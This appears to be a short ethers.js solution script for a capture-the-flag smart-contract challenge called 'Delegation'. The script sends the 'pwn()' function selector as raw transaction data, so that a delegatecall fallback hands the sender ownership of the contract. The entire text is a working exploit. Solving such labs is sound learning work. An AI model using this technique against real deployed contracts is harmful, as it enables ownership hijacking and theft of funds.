(async () => {
  const account = await ethers.getSigner();
  const contract = await ethers.getContractAt("Delegation", process.env.INSTANCE, account);
  data = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()")).slice(0, 10);
  log(`from : ${account.address}`)
  log(`to : ${contract.address}`)
  log(`send Data : ${data}`)
  const tx = {
    from: account.address,
    to: contract.address,
    data: data,
    gasLimit: 2e6
  }
  await account.sendTransaction(tx).then((tx) => {
    log(tx)
  })
})();
